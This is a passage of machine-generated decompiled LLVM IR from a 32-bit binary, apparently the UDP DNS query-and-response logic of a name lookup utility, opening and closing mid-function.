  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v1_80509e7, align 4
  %v1_80509ee = call i32 @function_804f2ab(i32 -1)
  store i32 %v1_80509ee, i32* %eax.global-to-local, align 4
  %v0_80509f3 = load i32, i32* @esp, align 4
  %v1_80509f3 = add i32 %v0_80509f3, 56
  %v2_80509f3 = inttoptr i32 %v1_80509f3 to i32*
  %v3_80509f3 = load i32, i32* %v2_80509f3, align 4
  store i32 %v3_80509f3, i32* %edx.global-to-local, align 4
  %v1_80509f7 = add i32 %v0_80509f3, 268
  %v2_80509f7 = inttoptr i32 %v1_80509f7 to i32*
  %v3_80509f7 = load i32, i32* %v2_80509f7, align 4
  store i32 %v3_80509f7, i32* %eax.global-to-local, align 4
  %v2_80509fe = mul i32 %v3_80509f3, 4
  %v3_80509fe = add i32 %v3_80509f7, %v2_80509fe
  %v4_80509fe = inttoptr i32 %v3_80509fe to i32*
  %v5_80509fe = load i32, i32* %v4_80509fe, align 4
  store i32 %v5_80509fe, i32* %edx.global-to-local, align 4
  %v2_8050a01 = add i32 %v0_80509f3, 48
  %v3_8050a01 = inttoptr i32 %v2_8050a01 to i32*
  store i32 %v5_80509fe, i32* %v3_8050a01, align 4
  %v0_8050a05 = load i32, i32* @esp, align 4
  %v1_8050a05 = add i32 %v0_8050a05, 16
  %v1_8050a08 = add i32 %v0_8050a05, 52
  %v2_8050a08 = inttoptr i32 %v1_8050a08 to i32*
  %v3_8050a08 = load i32, i32* %v2_8050a08, align 4
  %v5_8050a08 = icmp slt i32 %v3_8050a08, 0
  br i1 %v5_8050a08, label %dec_label_pc_80509b7.dec_label_pc_8050a4e_crit_edge, label %dec_label_pc_8050a0f

dec_label_pc_80509b7.dec_label_pc_8050a4e_crit_edge: ; preds = %dec_label_pc_80509b7
  %v0_8050a4e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a4e

dec_label_pc_8050a0f:                             ; preds = %dec_label_pc_80509b7
  store i32 %v3_8050a08, i32* %eax.global-to-local, align 4
  %v1_8050a13 = load i32, i32* @global_var_8058d78.197, align 8
  %v2_8050a13 = sub i32 %v3_8050a08, %v1_8050a13
  %v8_8050a13 = xor i32 %v1_8050a13, %v3_8050a08
  %v9_8050a13 = xor i32 %v2_8050a13, %v3_8050a08
  %v10_8050a13 = and i32 %v9_8050a13, %v8_8050a13
  %v11_8050a13 = icmp slt i32 %v10_8050a13, 0
  %v13_8050a13 = icmp slt i32 %v2_8050a13, 0
  %v2_8050a19 = icmp eq i1 %v13_8050a13, %v11_8050a13
  br i1 %v2_8050a19, label %dec_label_pc_8050a4e, label %dec_label_pc_8050a1b

dec_label_pc_8050a1b:                             ; preds = %dec_label_pc_8050a0f
  %v2_8050a1b = add i32 %v0_8050a05, 12
  %v3_8050a1b = inttoptr i32 %v2_8050a1b to i32*
  store i32 %v3_8050a08, i32* %v3_8050a1b, align 4
  %v1_8050a1c = add i32 %v0_8050a05, 8
  %v2_8050a1c = inttoptr i32 %v1_8050a1c to i32*
  store i32 1025, i32* %v2_8050a1c, align 4
  %v1_8050a21 = add i32 %v0_8050a05, 4
  %v2_8050a21 = inttoptr i32 %v1_8050a21 to i32*
  store i32 ptrtoint (i32* @global_var_8054c5c.198 to i32), i32* %v2_8050a21, align 4
  %v1_8050a26 = add i32 %v0_8050a05, 28
  %v2_8050a26 = inttoptr i32 %v1_8050a26 to i32*
  %v3_8050a26 = load i32, i32* %v2_8050a26, align 4
  %v6_8050a26 = inttoptr i32 %v0_8050a05 to i32*
  store i32 %v3_8050a26, i32* %v6_8050a26, align 4
  %v0_8050a2a = call i32 @function_8051640()
  store i32 %v0_8050a2a, i32* %eax.global-to-local, align 4
  %v0_8050a2f = load i32, i32* @esp, align 4
  %v1_8050a32 = add i32 %v0_8050a2f, 8
  %v2_8050a32 = inttoptr i32 %v1_8050a32 to i32*
  store i32 1025, i32* %v2_8050a32, align 4
  %v1_8050a37 = add i32 %v0_8050a2f, 52
  %v2_8050a37 = inttoptr i32 %v1_8050a37 to i32*
  %v3_8050a37 = load i32, i32* %v2_8050a37, align 4
  store i32 %v3_8050a37, i32* %edx.global-to-local, align 4
  %v1_8050a3b = mul i32 %v3_8050a37, 4
  %v2_8050a3b = add i32 %v1_8050a3b, 134581592
  %v3_8050a3b = inttoptr i32 %v2_8050a3b to i32*
  %v4_8050a3b = load i32, i32* %v3_8050a3b, align 4
  %v6_8050a3b = add i32 %v0_8050a2f, 4
  %v7_8050a3b = inttoptr i32 %v6_8050a3b to i32*
  store i32 %v4_8050a3b, i32* %v7_8050a3b, align 4
  %v1_8050a42 = add i32 %v0_8050a2f, 28
  %v2_8050a42 = inttoptr i32 %v1_8050a42 to i32*
  %v3_8050a42 = load i32, i32* %v2_8050a42, align 4
  %v6_8050a42 = inttoptr i32 %v0_8050a2f to i32*
  store i32 %v3_8050a42, i32* %v6_8050a42, align 4
  %v0_8050a46 = call i32 @function_8051640()
  store i32 %v0_8050a46, i32* %eax.global-to-local, align 4
  %v0_8050a4b = load i32, i32* @esp, align 4
  %v1_8050a4b = add i32 %v0_8050a4b, 16
  br label %dec_label_pc_8050a4e

dec_label_pc_8050a4e:                             ; preds = %dec_label_pc_80509b7.dec_label_pc_8050a4e_crit_edge, %dec_label_pc_8050a0f, %dec_label_pc_8050a1b
  %v1_8050a4e = phi i32 [ %v1_8050a05, %dec_label_pc_80509b7.dec_label_pc_8050a4e_crit_edge ], [ %v1_8050a05, %dec_label_pc_8050a0f ], [ %v1_8050a4b, %dec_label_pc_8050a1b ]
  %v0_8050a4e = phi i32 [ %v0_8050a4e.pre, %dec_label_pc_80509b7.dec_label_pc_8050a4e_crit_edge ], [ %v3_8050a08, %dec_label_pc_8050a0f ], [ %v0_8050a46, %dec_label_pc_8050a1b ]
  %v2_8050a4e = add i32 %v1_8050a4e, -4
  %v3_8050a4e = inttoptr i32 %v2_8050a4e to i32*
  store i32 %v0_8050a4e, i32* %v3_8050a4e, align 4
  %v0_8050a4f = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a4f = add i32 %v1_8050a4e, -8
  %v3_8050a4f = inttoptr i32 %v2_8050a4f to i32*
  store i32 %v0_8050a4f, i32* %v3_8050a4f, align 4
  %v1_8050a50 = add i32 %v1_8050a4e, -12
  %v2_8050a50 = inttoptr i32 %v1_8050a50 to i32*
  store i32 1, i32* %v2_8050a50, align 4
  %v1_8050a52 = add i32 %v1_8050a4e, 184
  store i32 %v1_8050a52, i32* @eax, align 4
  %v2_8050a59 = add i32 %v1_8050a4e, -16
  %v3_8050a59 = inttoptr i32 %v2_8050a59 to i32*
  store i32 %v1_8050a52, i32* %v3_8050a59, align 4
  %v2_8050a5a = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050a5a, i32* %eax.global-to-local, align 4
  %v0_8050a5f = load i32, i32* @esp, align 4
  %v1_8050a5f = add i32 %v0_8050a5f, 28
  %v2_8050a5f = inttoptr i32 %v1_8050a5f to i32*
  %v3_8050a5f = load i32, i32* %v2_8050a5f, align 4
  store i32 %v3_8050a5f, i32* %eax.global-to-local, align 4
  %v1_8050a63 = add i32 %v0_8050a5f, 260
  %v2_8050a63 = inttoptr i32 %v1_8050a63 to i32*
  %v3_8050a63 = load i32, i32* %v2_8050a63, align 4
  store i32 %v3_8050a63, i32* @edx, align 4
  %v2_8050a6a = add i32 %v0_8050a5f, 216
  %v3_8050a6a = inttoptr i32 %v2_8050a6a to i32*
  store i32 %v3_8050a5f, i32* %v3_8050a6a, align 4
  %v0_8050a71 = load i32, i32* @edx, align 4
  %v1_8050a71 = load i32, i32* @esp, align 4
  %v2_8050a71 = add i32 %v1_8050a71, 220
  %v3_8050a71 = inttoptr i32 %v2_8050a71 to i32*
  store i32 %v0_8050a71, i32* %v3_8050a71, align 4
  %v0_8050a78 = load i32, i32* @esp, align 4
  %v1_8050a78 = add i32 %v0_8050a78, 224
  %v2_8050a78 = inttoptr i32 %v1_8050a78 to i32*
  store i32 1, i32* %v2_8050a78, align 4
  %v0_8050a88 = load i32, i32* @esp, align 4
  %v1_8050a8b = load i32, i32* @ebx, align 4
  %v2_8050a8b = sub i32 512, %v1_8050a8b
  %v2_8050a8d = add i32 %v0_8050a88, 8
  %v3_8050a8d = inttoptr i32 %v2_8050a8d to i32*
  store i32 %v2_8050a8b, i32* %v3_8050a8d, align 4
  %v1_8050a8e = load i32, i32* @ebx, align 4
  %v2_8050a8e = add i32 %v1_8050a8e, %v1_8050876
  %v2_8050a92 = add i32 %v0_8050a88, 4
  %v3_8050a92 = inttoptr i32 %v2_8050a92 to i32*
  store i32 %v2_8050a8e, i32* %v3_8050a92, align 4
  %v1_8050a93 = add i32 %v0_8050a88, 216
  store i32 %v1_8050a93, i32* @eax, align 4
  %v3_8050a9a = inttoptr i32 %v0_8050a88 to i32*
  store i32 %v1_8050a93, i32* %v3_8050a9a, align 4
  %v0_8050a9b = call i32 @function_8051d90()
  store i32 %v0_8050a9b, i32* %eax.global-to-local, align 4
  %v0_8050aa0 = load i32, i32* @esp, align 4
  store i32 %v0_8050a9b, i32* @esi, align 4
  %v2_8050aa5 = icmp slt i32 %v0_8050a9b, 0
  br i1 %v2_8050aa5, label %dec_label_pc_8050f09, label %dec_label_pc_8050aad

dec_label_pc_8050aad:                             ; preds = %dec_label_pc_8050a4e
  %v1_8050aad = add i32 %v0_8050aa0, 172
  %v2_8050aad = inttoptr i32 %v1_8050aad to i16*
  store i16 2, i16* %v2_8050aad, align 2
  %v1_8050ab7 = load i32, i32* @esp, align 4
  %v2_8050ab7 = add i32 %v1_8050ab7, -4
  %v3_8050ab7 = inttoptr i32 %v2_8050ab7 to i32*
  store i32 %v0_8050a9b, i32* %v3_8050ab7, align 4
  %v1_8050ab8 = add i32 %v1_8050ab7, 164
  store i32 %v1_8050ab8, i32* %eax.global-to-local, align 4
  %v2_8050abf = add i32 %v1_8050ab7, -8
  %v3_8050abf = inttoptr i32 %v2_8050abf to i32*
  store i32 %v1_8050ab8, i32* %v3_8050abf, align 4
  %v1_8050ac0 = add i32 %v1_8050ab7, 32
  %v2_8050ac0 = inttoptr i32 %v1_8050ac0 to i32*
  %v3_8050ac0 = load i32, i32* %v2_8050ac0, align 4
  %v5_8050ac0 = add i32 %v1_8050ab7, -12
  %v6_8050ac0 = inttoptr i32 %v5_8050ac0 to i32*
  store i32 %v3_8050ac0, i32* %v6_8050ac0, align 4
  %v1_8050ac4 = add i32 %v1_8050ab7, -16
  %v2_8050ac4 = inttoptr i32 %v1_8050ac4 to i32*
  store i32 10, i32* %v2_8050ac4, align 4
  %v6_8050ac6 = call i32 @function_805178e(i32 -1, i8* %v5_8050ac6, i32 %v3_8050963, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050ac6, i32* %eax.global-to-local, align 4
  %v0_8050acb = load i32, i32* @esp, align 4
  %v1_8050acb = add i32 %v0_8050acb, 16
  %tmp46 = icmp slt i32 %v6_8050ac6, 1
  br i1 %tmp46, label %dec_label_pc_8050adc, label %dec_label_pc_8050ad2

dec_label_pc_8050ad2:                             ; preds = %dec_label_pc_8050aad
  %v1_8050ad2 = add i32 %v0_8050acb, 172
  %v2_8050ad2 = inttoptr i32 %v1_8050ad2 to i16*
  store i16 10, i16* %v2_8050ad2, align 2
  %v0_8050adc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050adc

dec_label_pc_8050adc:                             ; preds = %dec_label_pc_8050aad, %dec_label_pc_8050ad2
  %v0_8050af3 = phi i32 [ %v1_8050acb, %dec_label_pc_8050aad ], [ %v0_8050adc.pre, %dec_label_pc_8050ad2 ]
  %v1_8050adc = add i32 %v0_8050af3, 156
  %v2_8050adc = inttoptr i32 %v1_8050adc to i16*
  %v3_8050adc = load i16, i16* %v2_8050adc, align 2
  %v12_8050adc = icmp eq i16 %v3_8050adc, 10
  %v1_8050ae5 = icmp eq i1 %v12_8050adc, false
  %v1_8050af3 = add i32 %v0_8050af3, 158
  %v2_8050af3 = inttoptr i32 %v1_8050af3 to i16*
  store i16 13568, i16* %v2_8050af3, align 2
  %v0_8050afd = load i32, i32* @esp, align 4
  br i1 %v1_8050ae5, label %dec_label_pc_8050af3, label %dec_label_pc_8050b13

dec_label_pc_8050af3:                             ; preds = %dec_label_pc_8050adc
  %v1_8050b00 = add i32 %v0_8050afd, 32
  %v2_8050b00 = inttoptr i32 %v1_8050b00 to i32*
  %v3_8050b00 = load i32, i32* %v2_8050b00, align 4
  %v5_8050b00 = add i32 %v0_8050afd, -16
  %v6_8050b00 = inttoptr i32 %v5_8050b00 to i32*
  store i32 %v3_8050b00, i32* %v6_8050b00, align 4
  %v1_8050b04 = call i32 @function_804d518(i32 -1)
  store i32 %v1_8050b04, i32* %eax.global-to-local, align 4
  %v1_8050b09 = load i32, i32* @esp, align 4
  %v2_8050b09 = add i32 %v1_8050b09, 176
  %v3_8050b09 = inttoptr i32 %v2_8050b09 to i32*
  store i32 %v1_8050b04, i32* %v3_8050b09, align 4
  %v0_8050b10 = load i32, i32* @esp, align 4
  %v1_8050b10 = add i32 %v0_8050b10, 16
  br label %dec_label_pc_8050b13

dec_label_pc_8050b13:                             ; preds = %dec_label_pc_8050adc, %dec_label_pc_8050af3
  %v1_8050b13 = phi i32 [ %v1_8050b10, %dec_label_pc_8050af3 ], [ %v0_8050afd, %dec_label_pc_8050adc ]
  %v0_8050b13 = load i32, i32* @ecx, align 4
  %v2_8050b13 = add i32 %v1_8050b13, -4
  %v3_8050b13 = inttoptr i32 %v2_8050b13 to i32*
  store i32 %v0_8050b13, i32* %v3_8050b13, align 4
  %v1_8050b14 = add i32 %v1_8050b13, -8
  %v2_8050b14 = inttoptr i32 %v1_8050b14 to i32*
  store i32 17, i32* %v2_8050b14, align 4
  %v1_8050b16 = add i32 %v1_8050b13, -12
  %v2_8050b16 = inttoptr i32 %v1_8050b16 to i32*
  store i32 2, i32* %v2_8050b16, align 4
  %v1_8050b18 = add i32 %v1_8050b13, 156
  %v2_8050b18 = inttoptr i32 %v1_8050b18 to i16*
  %v3_8050b18 = load i16, i16* %v2_8050b18, align 2
  %v4_8050b18 = zext i16 %v3_8050b18 to i32
  store i32 %v4_8050b18, i32* %eax.global-to-local, align 4
  %v2_8050b20 = add i32 %v1_8050b13, -16
  %v3_8050b20 = inttoptr i32 %v2_8050b20 to i32*
  store i32 %v4_8050b18, i32* %v3_8050b20, align 4
  %v4_8050b21 = call i32 @function_804da00(i32 -1, i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v4_8050b21, i32* %eax.global-to-local, align 4
  %v1_8050b26 = load i32, i32* @esp, align 4
  %v2_8050b26 = add i32 %v1_8050b26, 36
  %v3_8050b26 = inttoptr i32 %v2_8050b26 to i32*
  store i32 %v4_8050b21, i32* %v3_8050b26, align 4
  %v0_8050b2a = load i32, i32* @esp, align 4
  %v1_8050b2a = add i32 %v0_8050b2a, 16
  %v0_8050b2d = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b2d = icmp slt i32 %v0_8050b2d, 0
  br i1 %v2_8050b2d, label %dec_label_pc_8050b5a, label %dec_label_pc_8050b31

dec_label_pc_8050b31:                             ; preds = %dec_label_pc_8050b13
  %v1_8050b31 = add i32 %v0_8050b2a, 172
  store i32 %v1_8050b31, i32* %eax.global-to-local, align 4
  %v0_8050b38 = load i32, i32* @edx, align 4
  %v2_8050b38 = add i32 %v0_8050b2a, 12
  %v3_8050b38 = inttoptr i32 %v2_8050b38 to i32*
  store i32 %v0_8050b38, i32* %v3_8050b38, align 4
  %v1_8050b39 = add i32 %v0_8050b2a, 8
  %v2_8050b39 = inttoptr i32 %v1_8050b39 to i32*
  store i32 28, i32* %v2_8050b39, align 4
  %v0_8050b3b = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b3b = add i32 %v0_8050b2a, 4
  %v3_8050b3b = inttoptr i32 %v2_8050b3b to i32*
  store i32 %v0_8050b3b, i32* %v3_8050b3b, align 4
  %v1_8050b3c = add i32 %v0_8050b2a, 36
  %v2_8050b3c = inttoptr i32 %v1_8050b3c to i32*
  %v3_8050b3c = load i32, i32* %v2_8050b3c, align 4
  %v6_8050b3c = inttoptr i32 %v0_8050b2a to i32*
  store i32 %v3_8050b3c, i32* %v6_8050b3c, align 4
  %v4_8050b40 = call i32 @function_804d8fc(i32 -1, i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v4_8050b40, i32* %eax.global-to-local, align 4
  %v0_8050b45 = load i32, i32* @esp, align 4
  %v2_8050b48 = icmp slt i32 %v4_8050b40, 0
  %v1_8050b4a = icmp eq i1 %v2_8050b48, false
  br i1 %v1_8050b4a, label %dec_label_pc_8050b63, label %dec_label_pc_8050b4c

dec_label_pc_8050b4c:                             ; preds = %dec_label_pc_8050b31
  %v1_8050b4c = call i32 @function_804b774(i32 -1)
  store i32 %v1_8050b4c, i32* %eax.global-to-local, align 4
  %v1_8050b51 = inttoptr i32 %v1_8050b4c to i32*
  %v2_8050b51 = load i32, i32* %v1_8050b51, align 4
  %v11_8050b51 = icmp eq i32 %v2_8050b51, 101
  %v0_8050ec3.pre = load i32, i32* @esp, align 4
  br i1 %v11_8050b51, label %dec_label_pc_8050ec3, label %dec_label_pc_8050b5a

dec_label_pc_8050b5a:                             ; preds = %dec_label_pc_8050b4c, %dec_label_pc_8050b13
  %v17_8050b5a = phi i32 [ %v1_8050b2a, %dec_label_pc_8050b13 ], [ %v0_8050ec3.pre, %dec_label_pc_8050b4c ]
  %v1_8050b5a = add i32 %v17_8050b5a, 28
  %v2_8050b5a = inttoptr i32 %v1_8050b5a to i32*
  %v3_8050b5a = load i32, i32* %v2_8050b5a, align 4
  %v4_8050b5a = add i32 %v3_8050b5a, 1
  store i32 %v4_8050b5a, i32* %v2_8050b5a, align 4
  br label %dec_label_pc_8050ee4.backedge

dec_label_pc_8050b63:                             ; preds = %dec_label_pc_8050b31
  %v0_8050b63 = load i32, i32* @ebx, align 4
  %v1_8050b63 = load i32, i32* @esi, align 4
  %v2_8050b63 = add i32 %v1_8050b63, %v0_8050b63
  store i32 %v2_8050b63, i32* %eax.global-to-local, align 4
  %v1_8050b66 = add i32 %v0_8050b45, 12
  %v2_8050b66 = inttoptr i32 %v1_8050b66 to i32*
  store i32 0, i32* %v2_8050b66, align 4
  %v0_8050b68 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b68 = add i32 %v0_8050b45, 8
  %v3_8050b68 = inttoptr i32 %v2_8050b68 to i32*
  store i32 %v0_8050b68, i32* %v3_8050b68, align 4
  %v2_8050b69 = add i32 %v0_8050b45, 4
  %v3_8050b69 = inttoptr i32 %v2_8050b69 to i32*
  store i32 %v1_8050876, i32* %v3_8050b69, align 4
  %v1_8050b6a = add i32 %v0_8050b45, 36
  %v2_8050b6a = inttoptr i32 %v1_8050b6a to i32*
  %v3_8050b6a = load i32, i32* %v2_8050b6a, align 4
  %v6_8050b6a = inttoptr i32 %v0_8050b45 to i32*
  store i32 %v3_8050b6a, i32* %v6_8050b6a, align 4
  %v0_8050b6e = call i32 @function_8051224()
  store i32 %v0_8050b6e, i32* %eax.global-to-local, align 4
  %v0_8050b73 = load i32, i32* @esp, align 4
  %v1_8050b73 = add i32 %v0_8050b73, 36
  %v2_8050b73 = inttoptr i32 %v1_8050b73 to i32*
  %v3_8050b73 = load i32, i32* %v2_8050b73, align 4
  %v2_8050b77 = add i32 %v0_8050b73, 228
  %v3_8050b77 = inttoptr i32 %v2_8050b77 to i32*
  store i32 %v3_8050b73, i32* %v3_8050b77, align 4
  %v0_8050b7e = load i32, i32* @esp, align 4
  %v1_8050b7e = add i32 %v0_8050b7e, 232
  %v2_8050b7e = inttoptr i32 %v1_8050b7e to i16*
  store i16 1, i16* %v2_8050b7e, align 2
  %v0_8050b88 = load i32, i32* @esp, align 4
  %v1_8050b8b = add i32 %v0_8050b88, 8
  %v2_8050b8b = inttoptr i32 %v1_8050b8b to i32*
  store i32 10000, i32* %v2_8050b8b, align 4
  %v1_8050b90 = add i32 %v0_8050b88, 4
  %v2_8050b90 = inttoptr i32 %v1_8050b90 to i32*
  store i32 1, i32* %v2_8050b90, align 4
  %v1_8050b92 = add i32 %v0_8050b88, 228
  store i32 %v1_8050b92, i32* %eax.global-to-local, align 4
  %v3_8050b99 = inttoptr i32 %v0_8050b88 to i32*
  store i32 %v1_8050b92, i32* %v3_8050b99, align 4
  %v0_8050b9a = call i32 @function_8051338()
  store i32 %v0_8050b9a, i32* %eax.global-to-local, align 4
  %v0_8050b9f = load i32, i32* @esp, align 4
  %v1_8050b9f = add i32 %v0_8050b9f, 16
  %tmp47 = icmp slt i32 %v0_8050b9a, 1
  br i1 %tmp47, label %dec_label_pc_8050ec3, label %dec_label_pc_8050baa

dec_label_pc_8050baa:                             ; preds = %dec_label_pc_8050b63
  %v1_8050baa = add i32 %v0_8050b9f, 12
  %v2_8050baa = inttoptr i32 %v1_8050baa to i32*
  store i32 0, i32* %v2_8050baa, align 4
  %v1_8050bac = add i32 %v0_8050b9f, 8
  %v2_8050bac = inttoptr i32 %v1_8050bac to i32*
  store i32 512, i32* %v2_8050bac, align 4
  %v2_8050bb1 = add i32 %v0_8050b9f, 4
  %v3_8050bb1 = inttoptr i32 %v2_8050bb1 to i32*
  store i32 %v1_8050876, i32* %v3_8050bb1, align 4
  %v1_8050bb2 = add i32 %v0_8050b9f, 36
  %v2_8050bb2 = inttoptr i32 %v1_8050bb2 to i32*
  %v3_8050bb2 = load i32, i32* %v2_8050bb2, align 4
  %v6_8050bb2 = inttoptr i32 %v0_8050b9f to i32*
  store i32 %v3_8050bb2, i32* %v6_8050bb2, align 4
  %v5_8050bb6 = call i32 @function_804d94c(i32 -1, i32 %v15_8050904, i32 %v3_8050963, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050bb6, i32* @eax, align 4
  %v1_8050bbb = load i32, i32* @esp, align 4
  %v2_8050bbb = add i32 %v1_8050bbb, 32
  %v3_8050bbb = inttoptr i32 %v2_8050bbb to i32*
  store i32 %v5_8050bb6, i32* %v3_8050bbb, align 4
  %v0_8050bbf = load i32, i32* @esp, align 4
  %v1_8050bbf = add i32 %v0_8050bbf, 16
  %v7_8050bc5 = icmp sgt i32 %v5_8050bb6, 11
  br i1 %v7_8050bc5, label %dec_label_pc_8050bcb, label %dec_label_pc_8050e78

dec_label_pc_8050bcb:                             ; preds = %dec_label_pc_8050baa
  %v0_8050bcb = load i32, i32* @ebx, align 4
  %v2_8050bcb = add i32 %v0_8050bbf, 12
  %v3_8050bcb = inttoptr i32 %v2_8050bcb to i32*
  store i32 %v0_8050bcb, i32* %v3_8050bcb, align 4
  %v0_8050bcc = load i32, i32* @ebx, align 4
  %v2_8050bcc = add i32 %v0_8050bbf, 8
  %v3_8050bcc = inttoptr i32 %v2_8050bcc to i32*
  store i32 %v0_8050bcc, i32* %v3_8050bcc, align 4
  %v1_8050bcd = add i32 %v0_8050bbf, 84
  store i32 %v1_8050bcd, i32* %eax.global-to-local, align 4
  %v2_8050bd1 = add i32 %v0_8050bbf, 4
  %v3_8050bd1 = inttoptr i32 %v2_8050bd1 to i32*
  store i32 %v1_8050bcd, i32* %v3_8050bd1, align 4
  %v3_8050bd2 = inttoptr i32 %v0_8050bbf to i32*
  store i32 %v1_8050876, i32* %v3_8050bd2, align 4
  %v0_8050bd3 = call i32 @function_8051ce4()
  store i32 %v0_8050bd3, i32* %eax.global-to-local, align 4
  %v0_8050bd8 = load i32, i32* @esp, align 4
  %v1_8050bd8 = add i32 %v0_8050bd8, 84
  %v2_8050bd8 = inttoptr i32 %v1_8050bd8 to i32*
  %v3_8050bd8 = load i32, i32* %v2_8050bd8, align 4
  store i32 %v3_8050bd8, i32* %edx.global-to-local, align 4
  %v2_8050bdc = add i32 %v0_8050bd8, 72
  %v3_8050bdc = inttoptr i32 %v2_8050bdc to i32*
  store i32 %v3_8050bd8, i32* %v3_8050bdc, align 4
  %v0_8050be0 = load i32, i32* @esp, align 4
  %v1_8050be0 = add i32 %v0_8050be0, 16
  %v1_8050be3 = add i32 %v0_8050be0, 60
  %v2_8050be3 = inttoptr i32 %v1_8050be3 to i32*
  %v3_8050be3 = load i32, i32* %v2_8050be3, align 4
  store i32 %v3_8050be3, i32* @eax, align 4
  %v0_8050be7 = load i32, i32* %edx.global-to-local, align 4
  %v12_8050be7 = icmp eq i32 %v0_8050be7, %v3_8050be3
  %v1_8050be9 = icmp eq i1 %v12_8050be7, false
  br i1 %v1_8050be9, label %dec_label_pc_8050e78, label %dec_label_pc_8050bef

dec_label_pc_8050bef:                             ; preds = %dec_label_pc_8050bcb
  %v1_8050bef = add i32 %v0_8050be0, 88
  %v2_8050bef = inttoptr i32 %v1_8050bef to i32*
  %v3_8050bef = load i32, i32* %v2_8050bef, align 4
  %v4_8050bef = icmp eq i32 %v3_8050bef, 0
  br i1 %v4_8050bef, label %dec_label_pc_8050e78, label %dec_label_pc_8050bfa

dec_label_pc_8050bfa:                             ; preds = %dec_label_pc_8050bef
  %v1_8050bfa = add i32 %v0_8050be0, 112
  %v2_8050bfa = inttoptr i32 %v1_8050bfa to i32*
  %v3_8050bfa = load i32, i32* %v2_8050bfa, align 4
  store i32 %v3_8050bfa, i32* @eax, align 4
  %v9_8050bfe = icmp eq i32 %v3_8050bfa, 3
  %v1_8050c01 = icmp eq i1 %v9_8050bfe, false
  br i1 %v1_8050c01, label %dec_label_pc_8050c69, label %dec_label_pc_8050c03

dec_label_pc_8050c03:                             ; preds = %dec_label_pc_8050bfa
  %v1_8050c03 = add i32 %v0_8050be0, 67
  %v2_8050c03 = inttoptr i32 %v1_8050c03 to i8*
  %v3_8050c03 = load i8, i8* %v2_8050c03, align 1
  %v4_8050c03 = icmp eq i8 %v3_8050c03, 0
  %v1_8050c08 = icmp eq i1 %v4_8050c03, false
  br i1 %v1_8050c08, label %dec_label_pc_8050c59, label %dec_label_pc_8050c0a

dec_label_pc_8050c0a:                             ; preds = %dec_label_pc_8050c03
  %v0_8050c0a = load i32, i32* @ecx, align 4
  %v2_8050c0a = add i32 %v0_8050be0, 12
  %v3_8050c0a = inttoptr i32 %v2_8050c0a to i32*
  store i32 %v0_8050c0a, i32* %v3_8050c0a, align 4
  %v1_8050c0b = add i32 %v0_8050be0, 8
  %v2_8050c0b = inttoptr i32 %v1_8050c0b to i32*
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v2_8050c0b, align 4
  %v1_8050c10 = add i32 %v0_8050be0, 4
  %v2_8050c10 = inttoptr i32 %v1_8050c10 to i32*
  store i32 134541995, i32* %v2_8050c10, align 4
  %v1_8050c15 = add i32 %v0_8050be0, 200
  store i32 %v1_8050c15, i32* @esi, align 4
  %v3_8050c1c = inttoptr i32 %v0_8050be0 to i32*
  store i32 %v1_8050c15, i32* %v3_8050c1c, align 4
  %v2_8050c1d = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050c1d, i32* %eax.global-to-local, align 4
  %v0_8050c22 = load i32, i32* @esp, align 4
  %v1_8050c22 = inttoptr i32 %v0_8050c22 to i32*
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v1_8050c22, align 4
  %v1_8050c29 = call i32 @function_804f2ab(i32 -1)
  store i32 %v1_8050c29, i32* %eax.global-to-local, align 4
  %v0_8050c2e = load i32, i32* @esp, align 4
  %v1_8050c2e = inttoptr i32 %v0_8050c2e to i32*
  %v2_8050c2e = load i32, i32* %v1_8050c2e, align 4
  store i32 %v2_8050c2e, i32* @eax, align 4
  %v3_8050c2e = add i32 %v0_8050c2e, 4
  %v1_8050c2f = inttoptr i32 %v3_8050c2e to i32*
  %v2_8050c2f = load i32, i32* %v1_8050c2f, align 4
  store i32 %v2_8050c2f, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050c2f, align 4
  %v0_8050c32 = load i32, i32* @esi, align 4
  store i32 %v0_8050c32, i32* %v1_8050c2e, align 4
  %v0_8050c33 = load i32, i32* @global_var_8058d78.197, align 8
  store i32 %v0_8050c33, i32* %ebx.global-to-local, align 4
  %v2_8050c39 = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050c39, i32* %eax.global-to-local, align 4
  %v0_8050c3e = load i32, i32* @esp, align 4
  %v1_8050c41 = add i32 %v0_8050c33, -1
  store i32 %v1_8050c41, i32* @ebx, align 4
  %v1_8050c42 = add i32 %v0_8050c3e, 52
  %v2_8050c42 = inttoptr i32 %v1_8050c42 to i32*
  %v3_8050c42 = load i32, i32* %v2_8050c42, align 4
  %v5_8050c42 = sub i32 %v3_8050c42, %v1_8050c41
  %v11_8050c42 = xor i32 %v3_8050c42, %v1_8050c41
  %v12_8050c42 = xor i32 %v5_8050c42, %v3_8050c42
  %v13_8050c42 = and i32 %v12_8050c42, %v11_8050c42
  %v14_8050c42 = icmp slt i32 %v13_8050c42, 0
  %v16_8050c42 = icmp slt i32 %v5_8050c42, 0
  %v2_8050c46 = icmp eq i1 %v16_8050c42, %v14_8050c42
  br i1 %v2_8050c46, label %dec_label_pc_8050c59, label %dec_label_pc_8050c48

dec_label_pc_8050c48:                             ; preds = %dec_label_pc_8050c0a
  %v4_8050c48 = add i32 %v3_8050c42, 1
  store i32 %v4_8050c48, i32* %v2_8050c42, align 4
  %v0_8050c4c = load i32, i32* @esp, align 4
  %v1_8050c4c = add i32 %v0_8050c4c, 56
  %v2_8050c4c = inttoptr i32 %v1_8050c4c to i32*
  %v3_8050c4c = load i32, i32* %v2_8050c4c, align 4
  store i32 %v3_8050c4c, i32* %edx.global-to-local, align 4
  %v2_8050c50 = add i32 %v0_8050c4c, 44
  %v3_8050c50 = inttoptr i32 %v2_8050c50 to i32*
